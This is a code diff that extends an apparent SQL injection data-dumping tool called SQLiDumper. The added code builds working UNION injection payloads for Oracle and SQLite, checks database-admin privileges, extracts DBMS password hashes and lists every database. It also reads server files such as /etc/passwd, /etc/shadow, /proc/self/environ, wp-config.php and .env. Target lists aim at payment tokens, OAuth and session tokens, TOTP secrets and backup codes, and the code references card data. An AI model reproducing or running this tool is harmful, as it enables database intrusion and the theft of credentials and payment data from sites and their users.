@@ -76,6 +76,47 @@ class SQLiDumper:
             "site_settings", "app_settings", "env", "environment",
             "api_keys", "secrets", "credentials", "keys",
         ],
+        # WordPress
+        "wordpress": [
+            "wp_users", "wp_usermeta", "wp_options", "wp_postmeta",
+            "wp_posts", "wp_comments", "wp_woocommerce_order_items",
+            "wp_wc_orders", "wp_woocommerce_payment_tokens",
+            "wp_wc_customer_lookup", "wp_woocommerce_api_keys",
+        ],
+        # Drupal
+        "drupal": [
+            "users_field_data", "user__roles", "config", "key_value",
+            "sessions", "flood", "watchdog",
+        ],
+        # Joomla
+        "joomla": [
+            "jos_users", "joomla_users", "j_users", "jos_session",
+            "jos_extensions", "jos_menu",
+        ],
+        # Magento
+        "magento": [
+            "admin_user", "customer_entity", "customer_entity_varchar",
+            "sales_order", "sales_order_payment", "core_config_data",
+            "vault_payment_token", "oauth_token",
+        ],
+        # Generic e-commerce
+        "ecommerce": [
+            "products", "product", "inventory", "stock", "prices", "price",
+            "coupons", "coupon", "discounts", "gift_cards", "gift_card",
+            "subscriptions", "subscription", "plans", "plan",
+            "addresses", "address", "shipping_addresses",
+        ],
+        # Tokens / sessions / OAuth
+        "tokens": [
+            "tokens", "token", "oauth_tokens", "api_tokens", "access_tokens",
+            "refresh_tokens", "sessions", "session", "jwt_tokens",
+            "personal_access_tokens", "bearer_tokens",
+        ],
+        # Logs (may contain sensitive data)
+        "logs": [
+            "logs", "log", "audit_log", "activity_log", "access_log",
+            "login_attempts", "failed_logins", "password_resets",
+        ],
     }
     
     # High-value column names (whitelist for targeted extraction)
@@ -127,6 +168,27 @@ class SQLiDumper:
             "address", "city", "state", "zip", "zipcode", "postal_code",
             "country", "phone", "ssn", "social_security",
             "tax_id", "ein", "dob", "date_of_birth", "birth_date",
+        ],
+        "tokens": [
+            "token", "access_token", "refresh_token", "api_token",
+            "auth_token", "jwt", "bearer_token", "session_token",
+            "reset_token", "activation_token", "verification_token",
+            "oauth_token", "csrf_token", "remember_token",
+        ],
+        "security": [
+            "security_question", "security_answer", "secret_question",
+            "secret_answer", "recovery_email", "backup_email",
+            "two_factor_secret", "totp_secret", "mfa_secret",
+            "backup_codes", "recovery_codes",
+        ],
+        "network": [
+            "ip_address", "ip", "last_login_ip", "registration_ip",
+            "user_agent", "last_user_agent", "session_id",
+            "last_login", "login_count", "failed_attempts",
+        ],
+        "phone": [
+            "phone", "phone_number", "mobile", "cell", "telephone",
+            "tel", "contact_number", "sms_number", "whatsapp",
         ],
     }
     
@@ -735,6 +797,87 @@ class SQLiDumper:
                 if found_any:
                     break
         
+        elif sqli.dbms == "oracle":
+            # Oracle: Use ROWNUM + CONCAT (via ||)
+            concat_cols = "||CHR(124)||CHR(124)||".join(
+                [f"NVL(TO_CHAR({c}),'NULL')" for c in columns]
+            )
+            marker_s = f"ora{random.randint(10000,99999)}"
+            marker_e = f"orx{random.randint(10000,99999)}"
+            marker_s_chr = "||".join([f"CHR({ord(ch)})" for ch in marker_s])
+            marker_e_chr = "||".join([f"CHR({ord(ch)})" for ch in marker_e])
+            
+            for col_idx in sqli.injectable_columns:
+                found_any = False
+                for row_idx in range(limit):
+                    null_list_copy = null_list.copy()
+                    null_list_copy[col_idx] = f"{marker_s_chr}||{concat_cols}||{marker_e_chr}"
+                    query = (
+                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
+                        f"FROM (SELECT {','.join(columns)}, ROWNUM rn FROM {table}) "
+                        f"WHERE rn={row_idx + 1}{suffix}"
+                    )
+                    test_params = params.copy()
+                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
+                    test_url = scanner._build_url(base, test_params)
+                    body, _ = await scanner._fetch(test_url, session)
+                    if not body:
+                        break
+                    match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
+                    if not match:
+                        if row_idx == 0:
+                            break
+                        break
+                    found_any = True
+                    raw = match.group(1).strip()
+                    if not raw:
+                        break
+                    values = raw.split("||")
+                    if len(values) >= len(columns):
+                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
+                        rows.append(row)
+                if found_any:
+                    break
+        
+        elif sqli.dbms == "sqlite":
+            # SQLite: GROUP_CONCAT or per-row LIMIT/OFFSET
+            concat_cols = "||'||'||".join([f"IFNULL({c},'NULL')" for c in columns])
+            marker_s = f"slt{random.randint(10000,99999)}"
+            marker_e = f"slx{random.randint(10000,99999)}"
+            
+            for col_idx in sqli.injectable_columns:
+                found_any = False
+                for row_idx in range(limit):
+                    null_list_copy = null_list.copy()
+                    null_list_copy[col_idx] = (
+                        f"'{marker_s}'||{concat_cols}||'{marker_e}'"
+                    )
+                    query = (
+                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
+                        f"FROM {table} LIMIT 1 OFFSET {row_idx}{suffix}"
+                    )
+                    test_params = params.copy()
+                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
+                    test_url = scanner._build_url(base, test_params)
+                    body, _ = await scanner._fetch(test_url, session)
+                    if not body:
+                        break
+                    match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
+                    if not match:
+                        if row_idx == 0:
+                            break
+                        break
+                    found_any = True
+                    raw = match.group(1).strip()
+                    if not raw:
+                        break
+                    values = raw.split("||")
+                    if len(values) >= len(columns):
+                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
+                        rows.append(row)
+                if found_any:
+                    break
+        
         logger.info(f"Extracted {len(rows)} rows from {table} ({', '.join(columns[:5])}...)")
         return rows
 
@@ -790,6 +933,326 @@ class SQLiDumper:
                     return raw
         
         return None
+
+    # ═══════════════════════════════════════════════════════════════
+    #  Advanced Extraction: File Read, Privileges, System Tables
+    # ═══════════════════════════════════════════════════════════════
+
+    FILE_READ_QUERIES = {
+        "mysql": "LOAD_FILE('{filepath}')",
+        "mssql": (
+            "STUFF((SELECT CAST(BulkColumn AS VARCHAR(MAX)) "
+            "FROM OPENROWSET(BULK '{filepath}', SINGLE_CLOB) AS x "
+            "FOR XML PATH('')),1,0,'')"
+        ),
+        "postgresql": "pg_read_file('{filepath}')",
+    }
+
+    PRIVILEGE_QUERIES = {
+        "mysql": {
+            "is_dba": "(SELECT IF(CURRENT_USER LIKE '%root%' OR (SELECT super_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(CURRENT_USER,'@',1) LIMIT 1)='Y','DBA','NOT_DBA'))",
+            "current_user": "CURRENT_USER()",
+            "hostname": "@@hostname",
+            "datadir": "@@datadir",
+            "version": "@@version",
+            "all_dbs": "(SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata)",
+        },
+        "mssql": {
+            "is_dba": "(SELECT CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN 'DBA' ELSE 'NOT_DBA' END)",
+            "current_user": "SYSTEM_USER",
+            "hostname": "@@SERVERNAME",
+            "version": "@@VERSION",
+            "all_dbs": "STUFF((SELECT ','+name FROM master..sysdatabases FOR XML PATH('')),1,1,'')",
+        },
+        "postgresql": {
+            "is_dba": "(SELECT CASE WHEN (SELECT usesuper FROM pg_user WHERE usename=current_user) THEN 'DBA' ELSE 'NOT_DBA' END)",
+            "current_user": "current_user",
+            "hostname": "inet_server_addr()::text",
+            "version": "version()",
+            "all_dbs": "(SELECT string_agg(datname,',') FROM pg_database WHERE datistemplate=false)",
+        },
+        "oracle": {
+            "is_dba": "(SELECT CASE WHEN (SELECT GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE GRANTEE=USER AND GRANTED_ROLE='DBA') IS NOT NULL THEN 'DBA' ELSE 'NOT_DBA' END FROM dual)",
+            "current_user": "USER",
+            "hostname": "(SELECT UTL_INADDR.GET_HOST_NAME FROM dual)",
+            "version": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
+            "all_dbs": "(SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username) FROM all_users)",
+        },
+    }
+
+    SYSTEM_TABLE_QUERIES = {
+        "mysql": {
+            "password_hashes": (
+                "(SELECT GROUP_CONCAT(user,0x3a,authentication_string SEPARATOR 0x3c62723e) "
+                "FROM mysql.user)"
+            ),
+        },
+        "mssql": {
+            "password_hashes": (
+                "STUFF((SELECT CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+name+CHAR(58)+"
+                "CONVERT(VARCHAR(MAX),password_hash,1) FROM master.sys.sql_logins "
+                "FOR XML PATH('')),1,0,'')"
+            ),
+            "linked_servers": (
+                "STUFF((SELECT CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+srvname "
+                "FROM master..sysservers FOR XML PATH('')),1,0,'')"
+            ),
+        },
+        "postgresql": {
+            "password_hashes": (
+                "(SELECT string_agg(usename||':'||COALESCE(passwd,'no_pass'),chr(10)) "
+                "FROM pg_shadow)"
+            ),
+        },
+    }
+
+    async def check_privileges(self, sqli: SQLiResult,
+                                session: aiohttp.ClientSession) -> Dict[str, str]:
+        """Check DBA privileges and gather server info.
+        
+        Returns dict with keys: is_dba, current_user, hostname, version, all_dbs, datadir.
+        """
+        if sqli.injection_type != "union" or not sqli.injectable_columns:
+            return {}
+        
+        dbms = sqli.dbms or "mysql"
+        priv_queries = self.PRIVILEGE_QUERIES.get(dbms, {})
+        if not priv_queries:
+            return {}
+        
+        scanner = self.scanner
+        base, params = scanner._parse_url(sqli.url)
+        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
+        null_list = ["NULL"] * sqli.column_count
+        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
+        
+        results = {}
+        for key, query_expr in priv_queries.items():
+            marker_s = f"prv{random.randint(10000, 99999)}"
+            marker_e = f"pre{random.randint(10000, 99999)}"
+            marker_s_hex = marker_s.encode().hex()
+            marker_e_hex = marker_e.encode().hex()
+            
+            for col_idx in sqli.injectable_columns[:1]:
+                nl = null_list.copy()
+                if dbms in ("mysql", "sqlite"):
+                    nl[col_idx] = f"CONCAT(0x{marker_s_hex},{query_expr},0x{marker_e_hex})"
+                elif dbms == "mssql":
+                    nl[col_idx] = f"CHAR(0x{marker_s_hex})+({query_expr})+CHAR(0x{marker_e_hex})"
+                elif dbms == "postgresql":
+                    chr_s = "||".join(f"CHR({ord(c)})" for c in marker_s)
+                    chr_e = "||".join(f"CHR({ord(c)})" for c in marker_e)
+                    nl[col_idx] = f"{chr_s}||({query_expr})||{chr_e}"
+                else:
+                    nl[col_idx] = f"CONCAT(0x{marker_s_hex},{query_expr},0x{marker_e_hex})"
+                
+                q = f"{prefix}UNION ALL SELECT {','.join(nl)}{suffix}"
+                test_params = params.copy()
+                test_params[sqli.parameter] = [self._inject_value(original, q, is_replace)]
+                test_url = scanner._build_url(base, test_params)
+                
+                body, _ = await scanner._fetch(test_url, session)
+                if body:
+                    match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
+                    if match:
+                        results[key] = match.group(1).strip()
+                        break
+        
+        if results:
+            logger.info(f"Privilege check: {results}")
+        return results
+
+    async def read_file(self, sqli: SQLiResult, filepath: str,
+                         session: aiohttp.ClientSession) -> Optional[str]:
+        """Read a file from the server via SQL injection.
+        
+        Uses LOAD_FILE (MySQL), OPENROWSET (MSSQL), or pg_read_file (PostgreSQL).
+        """
+        if sqli.injection_type != "union" or not sqli.injectable_columns:
+            return None
+        
+        dbms = sqli.dbms or "mysql"
+        file_query_tpl = self.FILE_READ_QUERIES.get(dbms)
+        if not file_query_tpl:
+            return None
+        
+        file_query = file_query_tpl.format(filepath=filepath)
+        
+        scanner = self.scanner
+        base, params = scanner._parse_url(sqli.url)
+        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
+        null_list = ["NULL"] * sqli.column_count
+        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
+        
+        marker_s = f"frd{random.randint(10000, 99999)}"
+        marker_e = f"fre{random.randint(10000, 99999)}"
+        marker_s_hex = marker_s.encode().hex()
+        marker_e_hex = marker_e.encode().hex()
+        
+        for col_idx in sqli.injectable_columns[:1]:
+            nl = null_list.copy()
+            nl[col_idx] = f"CONCAT(0x{marker_s_hex},{file_query},0x{marker_e_hex})"
+            
+            q = f"{prefix}UNION ALL SELECT {','.join(nl)}{suffix}"
+            test_params = params.copy()
+            test_params[sqli.parameter] = [self._inject_value(original, q, is_replace)]
+            test_url = scanner._build_url(base, test_params)
+            
+            body, _ = await scanner._fetch(test_url, session)
+            if body:
+                match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
+                if match:
+                    content = match.group(1)
+                    logger.info(f"File read successful: {filepath} ({len(content)} chars)")
+                    return content
+        
+        return None
+
+    async def dump_password_hashes(self, sqli: SQLiResult,
+                                    session: aiohttp.ClientSession) -> Optional[str]:
+        """Extract DBMS user password hashes from system tables.
+        
+        MySQL: mysql.user, MSSQL: master.sys.sql_logins, PostgreSQL: pg_shadow.
+        """
+        if sqli.injection_type != "union" or not sqli.injectable_columns:
+            return None
+        
+        dbms = sqli.dbms or "mysql"
+        sys_queries = self.SYSTEM_TABLE_QUERIES.get(dbms, {})
+        hash_query = sys_queries.get("password_hashes")
+        if not hash_query:
+            return None
+        
+        scanner = self.scanner
+        base, params = scanner._parse_url(sqli.url)
+        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
+        null_list = ["NULL"] * sqli.column_count
+        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
+        
+        marker_s = f"hsh{random.randint(10000, 99999)}"
+        marker_e = f"hse{random.randint(10000, 99999)}"
+        marker_s_hex = marker_s.encode().hex()
+        marker_e_hex = marker_e.encode().hex()
+        
+        for col_idx in sqli.injectable_columns[:1]:
+            nl = null_list.copy()
+            nl[col_idx] = f"CONCAT(0x{marker_s_hex},{hash_query},0x{marker_e_hex})"
+            
+            q = f"{prefix}UNION ALL SELECT {','.join(nl)}{suffix}"
+            test_params = params.copy()
+            test_params[sqli.parameter] = [self._inject_value(original, q, is_replace)]
+            test_url = scanner._build_url(base, test_params)
+            
+            body, _ = await scanner._fetch(test_url, session)
+            if body:
+                match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
+                if match:
+                    hashes = match.group(1)
+                    logger.info(f"Password hashes extracted ({len(hashes)} chars)")
+                    return hashes
+        
+        return None
+
+    async def enumerate_databases(self, sqli: SQLiResult,
+                                   session: aiohttp.ClientSession) -> List[str]:
+        """Enumerate all accessible databases (not just current).
+        
+        Returns list of database names.
+        """
+        if sqli.injection_type != "union" or not sqli.injectable_columns:
+            return []
+        
+        dbms = sqli.dbms or "mysql"
+        priv_queries = self.PRIVILEGE_QUERIES.get(dbms, {})
+        db_query = priv_queries.get("all_dbs")
+        if not db_query:
+            return []
+        
+        scanner = self.scanner
+        base, params = scanner._parse_url(sqli.url)
+        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
+        null_list = ["NULL"] * sqli.column_count
+        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
+        
+        marker_s = f"dbe{random.randint(10000, 99999)}"
+        marker_e = f"dbn{random.randint(10000, 99999)}"
+        marker_s_hex = marker_s.encode().hex()
+        marker_e_hex = marker_e.encode().hex()
+        
+        for col_idx in sqli.injectable_columns[:1]:
+            nl = null_list.copy()
+            nl[col_idx] = f"CONCAT(0x{marker_s_hex},{db_query},0x{marker_e_hex})"
+            
+            q = f"{prefix}UNION ALL SELECT {','.join(nl)}{suffix}"
+            test_params = params.copy()
+            test_params[sqli.parameter] = [self._inject_value(original, q, is_replace)]
+            test_url = scanner._build_url(base, test_params)
+            
+            body, _ = await scanner._fetch(test_url, session)
+            if body:
+                match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
+                if match:
+                    raw = match.group(1).strip()
+                    dbs = [d.strip() for d in raw.split(",") if d.strip()]
+                    logger.info(f"Enumerated {len(dbs)} databases: {dbs}")
+                    return dbs
+        
+        return []
+
+    # ═══════════════════════════════════════════════════════════════
+    #  Common server files to attempt reading
+    # ═══════════════════════════════════════════════════════════════
+    INTERESTING_FILES = {
+        "linux": [
+            "/etc/passwd",
+            "/etc/shadow",
+            "/etc/hosts",
+            "/proc/self/environ",
+            "/var/www/html/wp-config.php",
+            "/var/www/html/configuration.php",
+            "/var/www/html/.env",
+            "/var/www/html/config.php",
+            "/var/www/html/config/database.php",
+            "/var/www/html/app/etc/local.xml",
+            "/home/www/.env",
+        ],
+        "windows": [
+            "C:\\Windows\\System32\\drivers\\etc\\hosts",
+            "C:\\inetpub\\wwwroot\\web.config",
+            "C:\\inetpub\\wwwroot\\appsettings.json",
+        ],
+    }
+
+    async def auto_file_read(self, sqli: SQLiResult,
+                              session: aiohttp.ClientSession) -> Dict[str, str]:
+        """Attempt to read common interesting files from the server.
+        
+        Returns dict of {filepath: content} for successfully read files.
+        """
+        results = {}
+        
+        # Try Linux files first (most common web servers)
+        for filepath in self.INTERESTING_FILES["linux"]:
+            content = await self.read_file(sqli, filepath, session)
+            if content and len(content) > 5:
+                results[filepath] = content
+                logger.info(f"Read {filepath}: {len(content)} chars")
+                if len(results) >= 5:
+                    break
+            await asyncio.sleep(0.3)
+        
+        # Try Windows files if Linux ones failed
+        if not results:
+            for filepath in self.INTERESTING_FILES["windows"]:
+                content = await self.read_file(sqli, filepath, session)
+                if content and len(content) > 5:
+                    results[filepath] = content
+                    logger.info(f"Read {filepath}: {len(content)} chars")
+                    if len(results) >= 3:
+                        break
+                await asyncio.sleep(0.3)
+        
+        return results
 
     async def targeted_dump(self, sqli: SQLiResult,
                             session: aiohttp.ClientSession) -> DumpedData:
@@ -874,6 +1337,32 @@ class SQLiDumper:
                     dump.tables[table] = []
                 if column not in dump.tables[table]:
                     dump.tables[table].append(column)
+        
+        # Step 6: Advanced extraction — privileges, databases, hashes, file reads
+        try:
+            privs = await self.check_privileges(sqli, session)
+            if privs:
+                dump.raw_dumps.append(f"=== PRIVILEGES ===\n{json.dumps(privs, indent=2)}")
+                
+                # If DBA, try to get password hashes
+                if privs.get("is_dba") == "DBA":
+                    hashes = await self.dump_password_hashes(sqli, session)
+                    if hashes:
+                        dump.raw_dumps.append(f"=== DB PASSWORD HASHES ===\n{hashes}")
+                
+                # Enumerate all databases
+                all_dbs = await self.enumerate_databases(sqli, session)
+                if all_dbs:
+                    dump.raw_dumps.append(f"=== ALL DATABASES ===\n{','.join(all_dbs)}")
+            
+            # Try to read server files (only if DBA or MySQL with FILE priv)
+            if privs.get("is_dba") == "DBA" or sqli.dbms == "mysql":
+                files = await self.auto_file_read(sqli, session)
+                if files:
+                    for fpath, content in files.items():
+                        dump.raw_dumps.append(f"=== FILE: {fpath} ===\n{content[:5000]}")
+        except Exception as e:
+            logger.debug(f"Advanced extraction error: {e}")
         
         logger.info(f"Targeted dump complete for {sqli.url}: "
                     f"{len(dump.card_data)} card entries, "
